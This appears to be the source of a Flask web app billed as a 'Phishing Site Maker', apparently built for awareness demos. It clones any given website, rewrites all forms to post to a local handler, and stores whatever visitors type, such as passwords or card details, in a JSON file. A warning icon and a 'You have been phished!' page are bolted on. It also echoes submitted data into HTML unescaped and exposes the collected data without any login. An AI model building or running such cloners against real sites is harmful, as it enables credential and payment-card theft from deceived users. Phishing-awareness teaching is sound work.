from flask import Flask, request, render_template, redirect, url_for, jsonify, send_from_directory, Response
from bs4 import BeautifulSoup
import os
import requests
import json
from urllib.parse import urljoin


app = Flask(__name__)
BASE_DIR = os.path.dirname(os.path.abspath(__file__))

def scrape_website(url):
    response = requests.get(url)
    soup = BeautifulSoup(response.content, 'html.parser')
    return soup

def copy_resources(soup, base_url, target_dir):
    if not os.path.exists(target_dir):
        os.makedirs(target_dir)

    static_dir = os.path.join(target_dir, 'static')
    if not os.path.exists(static_dir):
        os.makedirs(static_dir)
    
    for tag in soup.find_all(['link', 'script', 'img']):
        attr = 'href' if tag.name == 'link' else 'src'
        if tag.has_attr(attr):
            resource_url = tag[attr]
            
            if not resource_url.startswith(('http', 'https')):
                resource_url = urljoin(base_url, resource_url)
            
            try:
                resource_content = requests.get(resource_url).content
                resource_name = os.path.basename(resource_url.split('?')[0])  # Avoid query strings
                resource_path = os.path.join(static_dir, resource_name)
                
                with open(resource_path, 'wb') as f:
                    f.write(resource_content)
                
                # Update the tag attribute to point to the local static file
                tag[attr] = url_for('serve_static_file', site_id=os.path.basename(target_dir), filename=resource_name)
            
            except Exception as e:
                print(f"Failed to copy resource: {resource_url} - Error: {e}")

    with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as file:
        file.write(soup.prettify())


def add_counter_to_fields(form, counter=1):
    for field in form.find_all(['input', 'textarea', 'select']):
        if field.has_attr('name'):
            field['name'] = f"{counter}_{field['name']}"
            counter += 1
        # if field.has_attr('id'):
        #     field['id'] = f"{counter}_{field['id']}"
        #     counter += 1
        # Recursively call the function for nested fields
        if field.find(['input', 'textarea', 'select']):
            add_counter_to_fields(field, counter)
    return form

def replicate_form(form, action_url):
    form['action'] = action_url
    form['method'] = 'POST'
    add_counter_to_fields(form)
    # count = 1
    # for input_tag in form.find_all(['input', 'textarea', 'select']):
    #     input_tag['name'] = input_tag.get('name', f'user_input_{count}')
    #     count += 1
    return str(form)

def add_phishing_form(soup, target_dir, site_id):
    forms = soup.find_all('form')
    action_url = url_for('handle_submit', site_id=site_id)
    for form in forms:
        form_html = replicate_form(form, action_url)
        form_soup = BeautifulSoup(form_html, 'html.parser')
        form.replace_with(form_soup)
    with open(os.path.join(target_dir, 'index.html'), 'w', encoding='utf-8') as file:
        file.write(soup.prettify())

@app.route('/', methods = ['GET'])
def index_get():
    return render_template('index.html')

@app.route('/', methods = ['POST'])
def index_post():
    url = request.form['url']
    
    generated_sites_dir = os.path.join(BASE_DIR, 'generated_sites')
    if not os.path.exists(generated_sites_dir):
        os.makedirs(generated_sites_dir)
    
    site_id = len(os.listdir(generated_sites_dir))
    target_dir = os.path.join(generated_sites_dir, str(site_id))
    
    data_dir = os.path.join(target_dir, 'data')
    if not os.path.exists(data_dir):
        os.makedirs(data_dir)
        
    soup = scrape_website(url)
    copy_resources(soup, url, target_dir)
    add_phishing_form(soup, target_dir, site_id)
    return redirect(url_for('view_generated_site', site_id=site_id))

@app.route('/site/<int:site_id>')
def view_generated_site(site_id):
    icon_code = '''
<div id="phishing-icon" title="Beware - This is a phishing site. Click here for more information.">
<div id="phishing-icon-container">
  <svg viewBox="0 0 24 24" fill="none" xmlns="http://www.w3.org/2000/svg" alt="Phishing Icon" id="phishing-icon" ><g id="SVGRepo_bgCarrier" stroke-width="0"></g><g id="SVGRepo_tracerCarrier" stroke-linecap="round" stroke-linejoin="round"></g><g id="SVGRepo_iconCarrier"> <path d="M12 15H12.01M12 12V9M4.98207 19H19.0179C20.5615 19 21.5233 17.3256 20.7455 15.9923L13.7276 3.96153C12.9558 2.63852 11.0442 2.63852 10.2724 3.96153L3.25452 15.9923C2.47675 17.3256 3.43849 19 4.98207 19Z" stroke="#000000" stroke-width="2" stroke-linecap="round" stroke-linejoin="round"></path> </g></svg>
  </div>
</div>
<script>
  document.getElementById('phishing-icon').addEventListener('click', function() {
    window.location.href = '/about';
  });
</script>
<style>
  #phishing-icon-container {
    position: fixed;
    top: 10px;
    right: 10px;
    z-index: 1000;
    background-color: #fff;
    border-radius: 100px;
    height: 25px;
    width: 25px;
  }
  #phishing-icon {
    width: 20px;
    height: 20px;
    cursor: pointer;
    text-align: center;
  }
  #phishing-icon:hover::after {
    content: attr(title);
    position: absolute;
    top: 25px;
    right: 30px;
    background-color: #fff;
    border: 1px solid #ddd;
    padding: 5px;
    font-size: 12px;
  }
</style>
'''
    with open(os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'index.html'), 'r', encoding='utf-8') as file:
        html = file.read() + icon_code
    return html
    # generated_site_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id))
    # return send_from_directory(generated_site_dir, 'index.html')

@app.route('/site/<int:site_id>/static/<path:filename>')
def serve_static_file(site_id, filename):
    static_dir = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'static')
    return send_from_directory(static_dir, filename)

@app.route('/submit/<int:site_id>', methods=['POST'])
def handle_submit(site_id):
    data = request.form.to_dict()
    data_file = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'data', 'data.json')
    
    if os.path.exists(data_file):
        with open(data_file, 'r', encoding='utf-8') as file:
            data_list = json.load(file)
    else:
        data_list = []

    data_list.append(data)
    with open(data_file, 'w', encoding='utf-8') as file:
        json.dump(data_list, file, ensure_ascii=False)
    
    return f"""
    <title>You have been phished! - Take Action - Phishing Site Maker - Made by Amit and Orel</title>
    <link rel="stylesheet" href="/static/css/style.css">
    <div class="center">
        <div>
            <h1>You have been phished!</h1>
            <p>Your submitted data: {data}</p>
            <p><b>Click on the button below to view and delete collected data:</b></p>
            <p><a href='/data/{site_id}'><button class="submit-button">View Collected Data</button></a></p>
            <p>Please delete your data if it's real and take necessary precautions.</p>
            <p style="color: red">If you've enterd a credit card details - block it as fast as possible.</p>
            <p style="color: red">If you've enterd a password - reset it as fast as possible.</p>
            <p><b>Stay safe on the internet. Be aware of phishing sites.</b></p>
            <p><a href='/site/{site_id}'><button class="submit-button">View Phishing Site</button></a></p>
        </div>
    </div>
    """

@app.route('/data/<int:site_id>', methods=['GET', 'POST'])
def view_data(site_id):
    data_file = os.path.join(BASE_DIR, 'generated_sites', str(site_id), 'data', 'data.json')
    if request.method == 'POST':
        data_index = int(request.form['data_index'])
        if os.path.exists(data_file):
            with open(data_file, 'r', encoding='utf-8') as file:
                data_list = json.load(file)
            if 0 <= data_index < len(data_list):
                data_list.pop(data_index)
                with open(data_file, 'w', encoding='utf-8') as file:
                    json.dump(data_list, file, ensure_ascii=False)
        return redirect(url_for('view_data', site_id=site_id))
    else:
        if os.path.exists(data_file):
            with open(data_file, 'r', encoding='utf-8') as file:
                data_list = json.load(file)
            response_html = '<title>Collected Data - Phishing Site Maker - Made by Amit and Orel</title> <link rel="stylesheet" href="/static/css/style.css"> <h1>Collected Data</h1><ul>'
            for i, data in enumerate(data_list):
                response_html += f"<li>{data} <form method='POST' style='display:inline;'><input type='hidden' name='data_index' value='{i}'><button class='submit-button red' type='submit'>Delete</button></form></li>"
                response_html += "<hr>"
            response_html += "</ul>"
            response_html += f"<p><a href='/'><button class='submit-button'>Back to Phishing Generator</button></a></p> <p><a href='/site/{site_id}'><button class='submit-button'>View Phishing Site</button></a></p>"
            return Response(response_html, mimetype='text/html')
        else:
            return '<title>Collected Data - Phishing Site Maker - Made by Amit and Orel</title> <link rel="stylesheet" href="/static/css/style.css"> <h1>No data found.</h1> <p><a href="/"><button class="submit-button">Back to Phishing Generator</button></a></p>'
        
@app.route('/about')
def about():
    return render_template('about.html')

if __name__ == '__main__':
    app.run(debug=True)
